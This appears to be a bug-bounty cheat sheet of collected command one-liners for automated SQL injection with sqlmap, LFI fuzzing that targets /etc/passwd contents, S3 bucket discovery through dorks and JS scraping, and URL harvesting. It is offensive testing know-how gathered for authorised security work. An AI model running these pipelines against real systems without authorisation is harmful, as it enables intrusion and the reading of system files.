# Bugbounty
## 2024 Oneliners found online

## Check SQL
waybackurls 'URL TARGET'| grep '='| httpx --silent --status-code| awk '{print $1}'| xargs -I{} sqlmap -u {} -v 3 --random-agent --tamper "between,randomcase,space2comment" --level 5 --risk 3 --batch --threads 5 --crawl 2 --suffix=') and 1=1-- -'

## Screenshot
cat hosts | gowitness scan file -f - --write-csv  
***

## 2025 Oneliners found online 

## LFI
findomain -t example.com -q | waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w ~/wordlist/LFI.txt ; done
***

### FIND S3

#### Google Dorking
(site:*.s3.amazonaws.com OR site:*.s3-external-1.amazonaws.com OR site:*.s3.dualstack.us-east-1.amazonaws.com OR site:*.s3.ap-south-1.amazonaws.com) "target.com"


Tool: dorks_eye
Link: https://github.com/BullsEye0/dorks-eye
- I forked the original. sudo-awk
***

#### Using subfinder + httpx

subfinder -d target.com -all -silent | httpx-toolkit -sc -title -td | grep "Amazon S3"
***

#### Find using JS files

katana -u https://site.com/ -d 5 -jc | grep '\.js$' | tee alljs.txt
cat alljs.txt | xargs -I {} curl -s {} | grep -oE 'http[s]?://[^"]*\.s3\.amazonaws\.com[^" ]*' | sort -u

***
#### Find using java2s3

subfinder -d target.com -all -silent | httpx-toolkit -o file.txt
cat file.txt | grep -oP '(?<=https?:\/\/).*'
python java2s3.py input.txt target.com output.txt
cat output3.txt | grep -E "S3 Buckets: \['[^]]+"
cat output.txt | grep -oP 'https?://[a-zA-Z0-9.-]*s3(\.dualstack)?\.ap-[a-z0-9-]+\.amazonaws\.com/[^\s"<>]+' | sort -u
cat output3.txt | grep -oP '([a-zA-Z0-9.-]+\.s3(\.dualstack)?\.[a-z0-9-]+\.amazonaws\.com)' | sort -u

***

#### Brute-Forcing S3 Bucket with LazyS3
You can also use this LazyS3 tool — it's basically a brute force tool for AWS S3 buckets using different permutations. you can run the following command by specifying the target domain

***

### Website you can use : 

https://osint.sh/buckets/
grayhatwarefare

Chrome plugin 
https://chromewebstore.google.com/detail/s3bucketlist/anngjobjhcbancaaogmlcffohpmcniki?hl=en

(site:*.s3.amazonaws.com OR site:*.s3-external-1.amazonaws.com OR site:*.s3.dualstack.us-east-1.amazonaws.com OR site:*.s3.ap-south-1.amazonaws.com) "target.com"
***
### Get urls

waymore -i hackerone.com -mode U -oU hackerone_urls.txt

cat subs.txt | gau | uro | tee -a all_urls

katana -u target.com | uro | tee -a urls.katana.out

cat targets.txt | gau | sort | uro | tee -a targets.gau

### credits to lostsec
***


